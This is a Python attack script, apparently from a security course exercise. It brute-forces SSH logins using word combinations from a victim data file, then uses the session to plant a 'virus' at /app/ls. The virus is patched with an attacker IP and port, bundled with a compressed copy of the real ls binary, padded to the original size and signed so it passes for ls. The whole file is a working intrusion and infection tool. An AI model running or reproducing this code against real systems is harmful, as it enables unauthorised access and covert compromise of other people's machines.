#!/usr/bin/env python3

from itertools import combinations, permutations
import paramiko
import time
import sys

def crackPassword(victim_ip, username):
    with open("victim.dat", "r") as v:
        victim = v.read().splitlines()

    # Dictionary attack
    for i in range(1, len(victim) + 1):
        for c in combinations(victim, i):  # C(victim, i)
            for p in permutations(c):
                password = ''.join(p)
                ssh_client = crackSSH(victim_ip, username, password)
                if ssh_client:
                    return ssh_client
    return None


def crackSSH(victim_ip, username, password):
    print("Username:", username, ", Password:", password)
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(hostname=victim_ip, username=username, password=password)
        print("- Connected!")
        return ssh_client
    except paramiko.AuthenticationException:
        print("- Authentication failed!")
        return None
    except Exception as e:
        print("-", e, "! Try again...")
        time.sleep(1)
        return crackSSH(victim_ip, username, password)


def infect(ssh_client, attacker_ip, attacker_port):
    virus_path = "/app/ls"
    
    with open("virus", "r") as v:
        virus = v.read()
        
    # Replace the ip and port in the virus code
    virus = virus.replace("server_host", f'\\\"{attacker_ip}\\\"')  # \"attacker_ip\"
    virus = virus.replace("server_port", attacker_port)
    
    _, stdout, _ = ssh_client.exec_command("which ls")  # find the path of ls
    ls_path = stdout.read().decode().strip()
    print("original ls path:", ls_path)

    _, stdout, _ = ssh_client.exec_command(f"ls -l {ls_path} | awk '{{print $5}}'")  # find the size of ls
    ls_size = stdout.read().decode().strip()
    
    # Get size of compressed ls and replace the "ls_zip_size" in virus
    _, stdout, _ = ssh_client.exec_command(f"zip -q new_ls {ls_path} && ls -l new_ls.zip | awk '{{print $5}}'")
    compressed_ls_size = stdout.read().decode().strip()
    print(f"[*] victim's compressed ls size: {compressed_ls_size}")
    virus = virus.replace('ls_zip_size', f'{compressed_ls_size}')
    
    # Calculate the virus size and replace the "virus_size" in virus
    backslash_count = virus.count('\\') # Count the number of backslashes in virus
    virus_size_without_append = len(virus) - backslash_count
    virus_size_without_append = virus_size_without_append - len("virus_size") + len(str(virus_size_without_append)) + 1 # I don't know why I need to +1
    virus = virus.replace('virus_size', f'{virus_size_without_append}')
    print(f"[*] victim's virus's size: {virus_size_without_append}")
    # print(virus)
    
    # Write the virus to the victim
    ssh_client.exec_command(f'echo "{virus}" > {virus_path}')
    # Append the compressed ls to the virus
    _, stdout, _ = ssh_client.exec_command(f"cat new_ls.zip >> {virus_path} && rm -f new_ls.zip")
    # Calculate the padding size and append the padding
    _, stdout, _ = ssh_client.exec_command(f"ls -l {virus_path} | awk '{{print $5}}'")
    virus_size_with_compressed_ls = stdout.read().decode().strip()
    padding_size = int(ls_size) - int(virus_size_with_compressed_ls) - 8  # last 8 bytes for signature
    _, stdout, _ = ssh_client.exec_command(f'dd if=/dev/zero bs={str(padding_size)} count=1 >> {virus_path};')
    
    # Sign the virus with b'20240000aabbccdd'
    _, stdout, _ = ssh_client.exec_command(f"echo -n '20240000aabbccdd' | xxd -r -p >> {virus_path};")
    _, stdout, _ = ssh_client.exec_command(f"chmod +x {virus_path};")
    print(f"[+] Victim Infected! Check victim's {virus_path}")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage:", sys.argv[0], "<victim_ip> <attacker_ip> <attacker_port>")
        sys.exit(1)
        
    victim_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    ssh_client = crackPassword(victim_ip, "csc2024")
    if not ssh_client:
        print("Cannot find the password!")
        sys.exit(1)

    infect(ssh_client, attacker_ip, attacker_port)
